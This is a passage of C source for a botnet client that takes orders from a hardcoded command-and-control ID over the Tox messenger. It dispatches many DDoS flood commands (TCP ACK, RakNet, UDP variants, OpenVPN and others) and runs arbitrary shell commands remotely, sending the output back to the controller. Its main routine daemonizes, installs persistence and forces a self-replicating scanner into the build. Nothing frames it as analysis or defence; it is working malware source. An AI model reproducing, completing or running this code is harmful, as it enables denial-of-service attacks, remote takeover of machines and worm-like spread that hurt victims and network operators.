                char resp[128]; snprintf(resp, sizeof(resp), "[+] TCP ACK attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop TCP ACK
        if (cmd && strcmp(cmd, "stop_tcp_ack") == 0) {
            stop_tcp_ack_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] TCP ACK attack stopped", 25, NULL);
            free(msg_copy); return;
        }
        
        // Brazilian Handshake Attack
        if (cmd && strcmp(cmd, "brazilian") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            char *length_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str && length_str) {
                start_brazilian_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str), atoi(length_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] Brazilian Handshake attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop Brazilian Handshake
        if (cmd && strcmp(cmd, "stop_brazilian") == 0) {
            stop_brazilian_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] Brazilian Handshake attack stopped", 36, NULL);
            free(msg_copy); return;
        }
        
        // RakNet Attack
        if (cmd && strcmp(cmd, "raknet") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str) {
                start_raknet_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] RakNet attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop RakNet
        if (cmd && strcmp(cmd, "stop_raknet") == 0) {
            stop_raknet_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] RakNet attack stopped", 24, NULL);
            free(msg_copy); return;
        }
        
        // UDP Hex Attack
        if (cmd && strcmp(cmd, "udp_hex") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            char *length_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str && length_str) {
                start_udp_hex_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str), atoi(length_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] UDP Hex attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop UDP Hex
        if (cmd && strcmp(cmd, "stop_udp_hex") == 0) {
            stop_udp_hex_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] UDP Hex attack stopped", 25, NULL);
            free(msg_copy); return;
        }
        
        // UDP Raw Attack
        if (cmd && strcmp(cmd, "udp_raw") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            char *length_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str && length_str) {
                start_udp_raw_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str), atoi(length_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] UDP Raw attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop UDP Raw
        if (cmd && strcmp(cmd, "stop_udp_raw") == 0) {
            stop_udp_raw_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] UDP Raw attack stopped", 25, NULL);
            free(msg_copy); return;
        }
        
        // UDP Plain Attack
        if (cmd && strcmp(cmd, "udp_plain") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            char *length_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str && length_str) {
                start_udp_plain_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str), atoi(length_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] UDP Plain attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop UDP Plain
        if (cmd && strcmp(cmd, "stop_udp_plain") == 0) {
            stop_udp_plain_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] UDP Plain attack stopped", 27, NULL);
            free(msg_copy); return;
        }
        
        // UDP Bypass Attack
        if (cmd && strcmp(cmd, "udp_bypass") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            char *length_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str && length_str) {
                start_udp_bypass_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str), atoi(length_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] UDP Bypass attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop UDP Bypass
        if (cmd && strcmp(cmd, "stop_udp_bypass") == 0) {
            stop_udp_bypass_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] UDP Bypass attack stopped", 28, NULL);
            free(msg_copy); return;
        }
        
        // OpenVPN Attack
        if (cmd && strcmp(cmd, "openvpn") == 0) {
            char *target = strtok(NULL, " ");
            char *port_str = strtok(NULL, " ");
            char *threads_str = strtok(NULL, " ");
            char *duration_str = strtok(NULL, " ");
            if (target && port_str && threads_str && duration_str) {
                start_openvpn_attack(target, atoi(port_str), atoi(threads_str), atoi(duration_str));
                char resp[128]; snprintf(resp, sizeof(resp), "[+] OpenVPN attack started on %s:%s", target, port_str);
                tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)resp, strlen(resp), NULL);
            }
            free(msg_copy); return;
        }
        
        // Stop OpenVPN
        if (cmd && strcmp(cmd, "stop_openvpn") == 0) {
            stop_openvpn_attack();
            tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, (uint8_t*)"[+] OpenVPN attack stopped", 25, NULL);
            free(msg_copy); return;
        }
        
        // Regular command execution
        char *admin = strdup((char*)message);
        char *admin_cmd = strtok(admin, " ");
        char *shell_cmd = strtok(NULL, "");
        if (shell_cmd) {
            FILE *fp = popen(shell_cmd, "r");
            if (fp) {
                uint8_t output[TOX_MAX_MESSAGE_LENGTH];
                while (fgets((char*)output, sizeof(output) - (strlen(admin_cmd) + 1), fp) != NULL) {
                    strcat((char*)output, admin_cmd);
                    tox_friend_send_message(tox, friend_num, TOX_MESSAGE_TYPE_NORMAL, output, strlen((char*)output), NULL);
                }
                pclose(fp);
            }
        }
        free(admin);
        free(msg_copy);
    }
}

int main() {
    pid_t pid = fork();
    if (pid < 0) return 1;
    if (pid > 0) return 0;
    
    setsid();
    chdir("/");
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    int lockfd = acquireLock("/tmp/xxeurbmrod", 1000);
    // If lock acquisition fails, continue anyway (don't exit)
    // The bot will still run, just without file locking
    
    char status[32];
    #if __linux__
        snprintf(status, sizeof(status), "LINUX");
    #elif __unix__
        snprintf(status, sizeof(status), "UNIX");
    #else
        snprintf(status, sizeof(status), "POSIX");
    #endif
    
    Tox *tox = tox_new(NULL, NULL);
    tox_self_set_status_message(tox, (uint8_t*)status, strlen(status), NULL);
    
    DHT_node nodes[] = { TOXNET_REPLACE_ME_BOOTSTRAPS };
    for (size_t i = 0; i < sizeof(nodes)/sizeof(DHT_node); i++) {
        unsigned char key_bin[TOX_PUBLIC_KEY_SIZE];
        sodium_hex2bin(key_bin, sizeof(key_bin), nodes[i].key_hex, sizeof(nodes[i].key_hex)-1, NULL, NULL, NULL);
        tox_bootstrap(tox, nodes[i].ip, nodes[i].port, key_bin, NULL);
        tox_add_tcp_relay(tox, nodes[i].ip, nodes[i].port, key_bin, NULL);
    }
    
    uint8_t tox_id_bin[TOX_ADDRESS_SIZE];
    tox_self_get_address(tox, tox_id_bin);
    
    tox_callback_friend_message(tox, friend_message_cb);
    tox_friend_add(tox, hex2bin(c2id), (uint8_t*)"Incoming", 9, NULL);
    
    char bot_name[64]; generate_random_name(bot_name, sizeof(bot_name));
    tox_self_set_status_message(tox, (uint8_t*)bot_name, strlen(bot_name), NULL);
    
    persist();
    
    // Force inclusion of all attack functions - prevents compiler optimization
    void (*dummy_funcs[])(void) = {
        (void(*)())start_vse_attack,
        (void(*)())stop_vse_attack,
        (void(*)())start_wra_attack,
        (void(*)())stop_wra_attack,
        (void(*)())start_udx_attack,
        (void(*)())stop_udx_attack,
        (void(*)())start_tcp_socket_attack,
        (void(*)())stop_tcp_socket_attack,
        (void(*)())start_tcp_bypass_attack,
        (void(*)())stop_tcp_bypass_attack,
        (void(*)())start_tcp_syndata_attack,
        (void(*)())stop_tcp_syndata_attack,
        (void(*)())start_tcp_stomp_attack,
        (void(*)())stop_tcp_stomp_attack,
        (void(*)())start_tcp_syn_attack,
        (void(*)())stop_tcp_syn_attack,
        (void(*)())start_socket_hold_attack,
        (void(*)())stop_socket_hold_attack,
        (void(*)())start_tcp_ack_attack,
        (void(*)())stop_tcp_ack_attack,
        (void(*)())start_brazilian_attack,
        (void(*)())stop_brazilian_attack,
        (void(*)())start_raknet_attack,
        (void(*)())stop_raknet_attack,
        (void(*)())start_udp_hex_attack,
        (void(*)())stop_udp_hex_attack,
        (void(*)())start_udp_raw_attack,
        (void(*)())stop_udp_raw_attack,
        (void(*)())start_udp_plain_attack,
        (void(*)())stop_udp_plain_attack,
        (void(*)())start_udp_bypass_attack,
        (void(*)())stop_udp_bypass_attack,
        (void(*)())start_openvpn_attack,
        (void(*)())stop_openvpn_attack,
        (void(*)())start_selfrep_scanner,
        (void(*)())stop_selfrep_scanner,
    };
    
    // Prevent optimization - use the dummy array
    if (dummy_funcs[0] == NULL) {
        return 1;
    }
    
    while (1) { 
        tox_iterate(tox, NULL); 
        usleep(tox_iteration_interval(tox) * 1000); 
    }
    
    tox_kill(tox);
    if (lockfd != -1) releaseLock(lockfd);
    return 0;
}
`